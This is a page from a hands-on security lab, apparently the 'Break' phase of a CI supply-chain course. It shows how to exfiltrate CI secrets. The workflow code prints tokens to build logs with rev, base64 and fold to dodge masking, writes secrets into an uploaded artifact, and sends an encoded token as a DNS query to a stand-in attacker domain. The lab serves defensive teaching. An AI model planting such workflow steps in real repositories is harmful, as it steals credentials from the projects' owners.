# Lab 2.4: Secret Exfiltration from CI

<div class="phase-stepper">
  <a href="../" class="phase-step done">Overview</a>
  <span class="phase-arrow">›</span>
  <a href="../understand/" class="phase-step done">Understand</a>
  <span class="phase-arrow">›</span>
  <span class="phase-step current">Break</span>
  <span class="phase-arrow">›</span>
  <a href="../defend/" class="phase-step upcoming">Defend</a>
  <span class="phase-arrow">›</span>
  <a href="../detect/" class="phase-step upcoming">Detect</a>
</div>

## Three Exfiltration Techniques

The CI pipeline already has `DEPLOY_TOKEN`, `DB_PASSWORD`, and `API_KEY` configured as Gitea action secrets (set by the lab's setup-repo.sh script). The attack modifies the CI workflow to exfiltrate them during a build.

### Technique 1: Build log leakage

Modify the CI workflow to echo secrets directly into the build log:

```bash
cd /repos/wl-webapp
cat > .gitea/workflows/ci.yml << 'EOF'
name: WeakLink Webapp CI
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Build
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
          DB_PASSWORD: ${{ secrets.DB_PASSWORD }}
        run: |
          echo "=== Build Log Exfiltration ==="
          echo "DEPLOY_TOKEN=${DEPLOY_TOKEN}"
          echo "DB_PASSWORD=${DB_PASSWORD}"
EOF
```

CI systems mask secrets in logs, but attackers bypass masking by transforming the value before printing:

Reversing the string defeats character-by-character masking:

```bash
echo "${DEPLOY_TOKEN}" | rev
```

Base64 encoding changes every character so the mask pattern does not match:

```bash
echo "${DEPLOY_TOKEN}" | base64
```

Splitting into chunks breaks the contiguous string the mask looks for:

```bash
echo "${DEPLOY_TOKEN}" | fold -w 10
```

### Technique 2: Artifact exfiltration

A workflow step writes secrets to a file that gets uploaded as a build artifact:

```bash
cat > .gitea/workflows/ci.yml << 'EOF'
name: WeakLink Webapp CI
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Build
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
          DB_PASSWORD: ${{ secrets.DB_PASSWORD }}
          API_KEY: ${{ secrets.API_KEY }}
        run: |
          mkdir -p dist
          echo "DEPLOY_TOKEN=${DEPLOY_TOKEN}" > dist/build.log
          echo "DB_PASSWORD=${DB_PASSWORD}" >> dist/build.log
          echo "API_KEY=${API_KEY}" >> dist/build.log
      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          path: dist/build.log
EOF
```

Anyone who can download build artifacts (often any repo collaborator) gets the secrets.

### Technique 3: DNS exfiltration

A workflow step base64-encodes a secret and sends it as a DNS subdomain query:

```bash
cat > .gitea/workflows/ci.yml << 'EOF'
name: WeakLink Webapp CI
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Build
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
        run: |
          ENCODED=$(echo -n "${DEPLOY_TOKEN}" | base64 | tr '+/' '-_' | tr -d '=')
          dig ${ENCODED}.exfil.attacker.com
EOF
```

DNS exfiltration is dangerous because DNS queries are rarely blocked by firewalls, do not appear in HTTP proxy logs, and the data is hidden in the subdomain.

**Checkpoint:** You should now have demonstrated all three exfiltration channels: build log output, artifact file with secrets, and encoded DNS query payload.

### Step 4: Check for compromise markers

```bash
if [ -f dist/build.log ] && grep -q "DEPLOY_TOKEN" dist/build.log; then
    echo "COMPROMISED: Secrets found in build artifacts."
fi
```
